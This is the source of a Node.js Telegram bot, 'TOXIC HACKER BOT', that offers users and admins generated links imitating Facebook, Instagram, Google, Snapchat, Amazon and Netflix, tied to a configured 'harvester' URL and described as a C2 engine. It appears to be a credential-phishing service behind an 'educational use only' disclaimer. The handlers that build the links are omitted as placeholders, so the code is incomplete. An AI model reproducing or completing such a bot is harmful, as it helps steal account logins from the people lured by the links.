const { Telegraf, Markup } = require('telegraf');
const fs = require('fs');
const http = require('http');

// --- ⚙️ CONFIGURATION (Loaded from Render's Environment Variables) ⚙️ ---
const BOT_TOKEN = process.env.BOT_TOKEN;
const HARVESTER_URL = process.env.HARVESTER_URL;
const OWNER_ID = process.env.OWNER_ID; 
const CHANNEL_ID = process.env.CHANNEL_ID;
const CHANNEL_LINK = process.env.CHANNEL_LINK;

if (!BOT_TOKEN || !HARVESTER_URL || !OWNER_ID || !CHANNEL_ID || !CHANNEL_LINK) {
    console.error("FATAL ERROR: One or more environment variables are missing. Bot cannot start.");
    process.exit(1);
}

const bot = new Telegraf(BOT_TOKEN);
const DB_PATH = './db.json';
let adminState = {};

// --- DB Functions ---
const readDb = () => {
    if (!fs.existsSync(DB_PATH)) {
        fs.writeFileSync(DB_PATH, JSON.stringify({ users: {}, admins: [parseInt(OWNER_ID)], blocked_users: [] }, null, 2));
    }
    return JSON.parse(fs.readFileSync(DB_PATH));
};
const writeDb = (data) => fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
const isAdmin = (id) => readDb().admins.includes(parseInt(id));

// --- Start Message ---
const startMessage = `
🔥 **TOXIC HACKER BOT**

🔗 *Credential Testing Interfaces:*
 • Facebook
 • Instagram
 • Snapchat
 • Google
 • Amazon

🎯 *For Educational Use Only!*
 ❌ Illegal Use is Prohibited.
 ✅ Ethical Hacking | OSINT | Red Teaming

Join: @ToxicBack2025
`;

// --- KEYBOARDS ---
const adminKeyboard = Markup.inlineKeyboard([
    [Markup.button.callback('📊 User Status', 'admin_status'), Markup.button.callback('📢 Broadcast', 'admin_broadcast')],
    [Markup.button.callback('🔗 Generate Link', 'admin_generate_link')],
    [Markup.button.callback('➕ Add Admin', 'admin_add'), Markup.button.callback('➖ Remove Admin', 'admin_remove')],
    [Markup.button.callback('🚫 Block User', 'admin_block'), Markup.button.callback('✅ Unblock User', 'admin_unblock')]
]);

const linkGenerationKeyboard = Markup.inlineKeyboard([
    [Markup.button.callback('📸 Instagram', 'gen_link_Instagram'), Markup.button.callback('📘 Facebook', 'gen_link_Facebook')],
    [Markup.button.callback('🇬 Google', 'gen_link_Google'), Markup.button.callback('👻 Snapchat', 'gen_link_Snapchat')],
    [Markup.button.callback('📦 Amazon', 'gen_link_Amazon'), Markup.button.callback('🎬 Netflix', 'gen_link_Netflix')],
    [Markup.button.callback('⬅️ Back to Panel', 'admin_panel_back')]
]);

// --- /start COMMAND ---
bot.start(async (ctx) => {
    const userId = ctx.from.id;
    const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
    const db = readDb();

    if (db.blocked_users.includes(userId)) return;

    try {
        const chatMember = await ctx.telegram.getChatMember(CHANNEL_ID, userId);
        if (!['member', 'administrator', 'creator'].includes(chatMember.status)) throw new Error();

        if (!db.users[userId]) {
            db.users[userId] = { username, joinDate: new Date().toISOString() };
            writeDb(db);
            const safeUsername = username.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
            ctx.telegram.sendMessage(OWNER_ID, `*New User Joined*\n\\- *User:* ${safeUsername}\n\\- *ID:* \`${userId}\``, { parse_mode: 'MarkdownV2' });
        }

        if (isAdmin(userId)) {
            await ctx.replyWithMarkdown('👑 *Admin Panel Activated*', adminKeyboard);
        } else {
            // NAYA FIX: Keyboard bhejne ka tareeka theek kiya gaya hai
            const userLinkKeyboard = Markup.inlineKeyboard(linkGenerationKeyboard.reply_markup.inline_keyboard.slice(0, -1));
            await ctx.replyWithMarkdown(startMessage, userLinkKeyboard);
        }
    } catch {
        await ctx.replyWithMarkdown(`🛑 *ACCESS DENIED*\n\nJoin our channel to continue.`, Markup.inlineKeyboard([
            [Markup.button.url('➡️ Join Channel', CHANNEL_LINK)],
            [Markup.button.callback('✅ I Joined', 'check_join')]
        ]));
    }
});

// --- Callback Query Handler ---
bot.on('callback_query', async (ctx) => {
    // ... (Callback handler ka code waisa hi rahega jaisa pehle ke jawaab mein tha) ...
});

// --- Text Handler ---
bot.on('text', async (ctx) => {
    // ... (Text handler ka code waisa hi rahega jaisa pehle ke jawaab mein tha) ...
});

// --- "STAY-ALIVE" SERVER ---
const PORT = process.env.PORT || 10000;
http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end(`Bot is alive. Last check: ${new Date().toISOString()}`);
}).listen(PORT, () => {
    console.log(`Stay-alive server listening on port ${PORT}`);
});

// Launch the bot
bot.launch();
console.log('🔥 Flawless C2 Engine is online.');

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
